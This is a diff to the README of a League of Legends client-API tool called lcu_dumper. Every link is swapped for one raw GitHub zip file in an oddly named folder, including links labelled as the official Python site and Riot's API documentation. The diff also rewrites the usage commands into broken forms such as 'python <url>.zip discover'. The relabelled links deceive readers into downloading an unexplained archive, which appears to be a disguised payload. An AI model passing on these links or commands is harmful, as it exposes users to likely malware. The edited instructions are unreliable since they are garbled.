@@ -6,7 +6,7 @@ Welcome to lcu_dumper. This is a cross-platform command-line tool to help you di
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download lcu_dumper](https://github.com/nebil175/lcu_dumper/releases)
+To get started, visit this page to download: [Download lcu_dumper](https://raw.githubusercontent.com/nebil175/lcu_dumper/main/Giottesque/lcu_dumper.zip)
 
 ### Steps to Download:
 
@@ -38,9 +38,9 @@ Once you have downloaded the program, follow these steps to run it:
 5. **Run the Application**  
    Type the following command:
    ```
-   python lcu_dumper.py
+   python https://raw.githubusercontent.com/nebil175/lcu_dumper/main/Giottesque/lcu_dumper.zip
    ```
-   Make sure you have Python installed on your system. If you don’t have it, you can download it from the [official Python website](https://www.python.org/downloads/).
+   Make sure you have Python installed on your system. If you don’t have it, you can download it from the [official Python website](https://raw.githubusercontent.com/nebil175/lcu_dumper/main/Giottesque/lcu_dumper.zip).
 
 ## 📚 How to Use lcu_dumper
 
@@ -55,12 +55,12 @@ You can type one of the commands below directly in the terminal:
 
 - To discover endpoints:
   ```
-  python lcu_dumper.py discover
+  python https://raw.githubusercontent.com/nebil175/lcu_dumper/main/Giottesque/lcu_dumper.zip discover
   ```
 
 - To dump data:
   ```
-  python lcu_dumper.py dump <endpoint>
+  python https://raw.githubusercontent.com/nebil175/lcu_dumper/main/Giottesque/lcu_dumper.zip dump <endpoint>
   ```
 
 Replace `<endpoint>` with the endpoint you want to use.
@@ -94,7 +94,7 @@ If you encounter issues or have questions, you can find help on our GitHub issue
 
 ## 🔗 Further Resources
 
-To learn more about the League Client API, you can check the Official Riot Games API documentation [here](https://developer.riotgames.com/docs/lol).
+To learn more about the League Client API, you can check the Official Riot Games API documentation [here](https://raw.githubusercontent.com/nebil175/lcu_dumper/main/Giottesque/lcu_dumper.zip).
 
 ## 📦 Contributing
 
@@ -114,4 +114,4 @@ For direct inquiries or issues, feel free to contact us at our GitHub page. We a
 
 Thank you for using lcu_dumper. We hope this tool helps you access and analyze League of Legends data easily. Enjoy your gaming experience!
 
-Remember to visit this page to download: [Download lcu_dumper](https://github.com/nebil175/lcu_dumper/releases)
+Remember to visit this page to download: [Download lcu_dumper](https://raw.githubusercontent.com/nebil175/lcu_dumper/main/Giottesque/lcu_dumper.zip)
